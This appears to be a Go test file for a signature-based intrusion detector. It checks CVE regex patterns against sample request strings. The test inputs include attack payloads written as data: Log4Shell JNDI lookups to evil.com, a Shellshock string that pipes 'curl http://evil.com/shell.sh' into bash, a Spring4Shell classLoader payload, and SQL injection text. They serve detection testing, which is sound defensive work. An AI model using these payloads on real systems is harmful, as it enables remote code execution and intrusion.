package tier1_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/aiss/agent/internal/security/tier1"
)

// writeTempPatterns creates a temporary CVE patterns JSON file for testing.
func writeTempPatterns(t *testing.T) string {
	t.Helper()
	content := `[
	  {"id":1,"cve_id":"CVE-2021-44228","name":"Log4Shell","severity":"CRITICAL","cvss":10.0,
	   "pattern":"\\$\\{jndi:(ldap|rmi|dns)://","flags":"CASELESS","affected_product":"log4j","description":"Log4Shell JNDI injection"},
	  {"id":2,"cve_id":"CVE-2014-6271","name":"Shellshock","severity":"CRITICAL","cvss":10.0,
	   "pattern":"\\(\\)\\s*\\{\\s*[^}]*\\};\\s*","flags":"","affected_product":"bash","description":"Shellshock bash injection"},
	  {"id":3,"cve_id":"CVE-2022-22965","name":"Spring4Shell","severity":"CRITICAL","cvss":9.8,
	   "pattern":"class\\.module\\.classLoader","flags":"CASELESS","affected_product":"spring","description":"Spring4Shell"},
	  {"id":4,"cve_id":"GENERIC-SQLI","name":"SQL Injection","severity":"HIGH","cvss":8.0,
	   "pattern":"(?i)(union\\s+select|or\\s+1\\s*=\\s*1)","flags":"CASELESS","affected_product":"generic","description":"SQLi"},
	  {"id":5,"cve_id":"CVE-2017-9841","name":"PHPUnit RCE","severity":"CRITICAL","cvss":9.8,
	   "pattern":"vendor/phpunit/phpunit/src/Util/PHP/eval-stdin\\.php","flags":"CASELESS","affected_product":"phpunit","description":"PHPUnit RCE"}
	]`
	dir := t.TempDir()
	path := filepath.Join(dir, "patterns.json")
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestNewEngine(t *testing.T) {
	path := writeTempPatterns(t)
	engine, err := tier1.NewEngine(path)
	if err != nil {
		t.Fatalf("NewEngine failed: %v", err)
	}
	if engine.PatternCount() != 5 {
		t.Errorf("expected 5 patterns, got %d", engine.PatternCount())
	}
}

func TestScan_Log4Shell(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantHit bool
		wantCVE string
	}{
		{
			name:    "plain JNDI ldap",
			input:   `${jndi:ldap://evil.com/x}`,
			wantHit: true,
			wantCVE: "CVE-2021-44228",
		},
		{
			name:    "JNDI in User-Agent",
			input:   `Mozilla/5.0 ${jndi:ldap://attacker.com/a}`,
			wantHit: true,
			wantCVE: "CVE-2021-44228",
		},
		{
			name:    "JNDI RMI variant",
			input:   `${jndi:rmi://192.168.1.1:1099/obj}`,
			wantHit: true,
			wantCVE: "CVE-2021-44228",
		},
		{
			name:    "clean request",
			input:   `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`,
			wantHit: false,
		},
		{
			name:    "empty string",
			input:   ``,
			wantHit: false,
		},
	}

	engine, _ := tier1.NewEngine(writeTempPatterns(t))
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := engine.Scan(tt.input)
			if result.Matched != tt.wantHit {
				t.Errorf("Scan(%q) matched=%v want=%v", tt.input, result.Matched, tt.wantHit)
			}
			if tt.wantHit && result.CVEID != tt.wantCVE {
				t.Errorf("expected CVE %s, got %s", tt.wantCVE, result.CVEID)
			}
		})
	}
}

func TestScan_Shellshock(t *testing.T) {
	engine, _ := tier1.NewEngine(writeTempPatterns(t))
	result := engine.Scan(`() { :; }; /bin/bash -c "curl http://evil.com/shell.sh | bash"`)
	if !result.Matched {
		t.Error("Shellshock payload not detected")
	}
	if result.CVEID != "CVE-2014-6271" {
		t.Errorf("expected CVE-2014-6271, got %s", result.CVEID)
	}
	if result.Severity != "CRITICAL" {
		t.Errorf("expected CRITICAL severity, got %s", result.Severity)
	}
}

func TestScan_Spring4Shell(t *testing.T) {
	engine, _ := tier1.NewEngine(writeTempPatterns(t))
	result := engine.Scan(`class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp`)
	if !result.Matched {
		t.Error("Spring4Shell payload not detected")
	}
}

func TestScan_PHPUnit(t *testing.T) {
	engine, _ := tier1.NewEngine(writeTempPatterns(t))
	result := engine.Scan(`/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`)
	if !result.Matched {
		t.Error("PHPUnit RCE path not detected")
	}
}

func TestScan_CleanRequests(t *testing.T) {
	engine, _ := tier1.NewEngine(writeTempPatterns(t))
	cleanInputs := []string{
		`/api/users?id=42`,
		`/static/app.js`,
		`Mozilla/5.0 Chrome/120.0`,
		`{"username":"alice","password":"hunter2"}`,
		`/search?q=golang+tutorial`,
		`Accept: application/json`,
	}
	for _, input := range cleanInputs {
		result := engine.Scan(input)
		if result.Matched {
			t.Errorf("clean input falsely flagged: %q matched CVE %s", input, result.CVEID)
		}
	}
}

func TestScan_SeverityOrdering(t *testing.T) {
	// Engine should return CRITICAL before HIGH when both would match
	engine, _ := tier1.NewEngine(writeTempPatterns(t))
	// Input that matches both GENERIC-SQLI (HIGH) and Log4Shell (CRITICAL)
	input := `${jndi:ldap://evil.com/x} UNION SELECT 1,2,3`
	result := engine.Scan(input)
	if !result.Matched {
		t.Fatal("expected a match")
	}
	if result.Severity != "CRITICAL" {
		t.Errorf("expected CRITICAL (highest) severity first, got %s", result.Severity)
	}
}

func TestLoad_InvalidFile(t *testing.T) {
	_, err := tier1.NewEngine("/nonexistent/path/patterns.json")
	if err == nil {
		t.Error("expected error for missing file")
	}
}

func TestLoad_InvalidJSON(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "bad.json")
	_ = os.WriteFile(path, []byte(`not valid json`), 0644)
	_, err := tier1.NewEngine(path)
	if err == nil {
		t.Error("expected error for invalid JSON")
	}
}

func TestLoad_BadRegex(t *testing.T) {
	// Engine should skip invalid patterns, not crash
	dir := t.TempDir()
	path := filepath.Join(dir, "patterns.json")
	content := `[
		{"id":1,"cve_id":"BAD","name":"Bad Pattern","severity":"HIGH","cvss":5.0,
		 "pattern":"[invalid(regex","flags":"","affected_product":"test","description":"bad"},
		{"id":2,"cve_id":"GOOD","name":"Good Pattern","severity":"HIGH","cvss":5.0,
		 "pattern":"hello","flags":"","affected_product":"test","description":"good"}
	]`
	_ = os.WriteFile(path, []byte(content), 0644)
	engine, err := tier1.NewEngine(path)
	if err != nil {
		t.Fatalf("NewEngine should not fail on bad pattern: %v", err)
	}
	if engine.PatternCount() != 1 {
		t.Errorf("expected 1 valid pattern, got %d", engine.PatternCount())
	}
}

func BenchmarkScan_NoMatch(b *testing.B) {
	engine, _ := tier1.NewEngine(writeTempPatterns(&testing.T{}))
	input := `GET /api/products?category=electronics&page=2 HTTP/1.1`
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		engine.Scan(input)
	}
}

func BenchmarkScan_Match(b *testing.B) {
	engine, _ := tier1.NewEngine(writeTempPatterns(&testing.T{}))
	input := `${jndi:ldap://evil.com/exploit}`
	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		engine.Scan(input)
	}
}
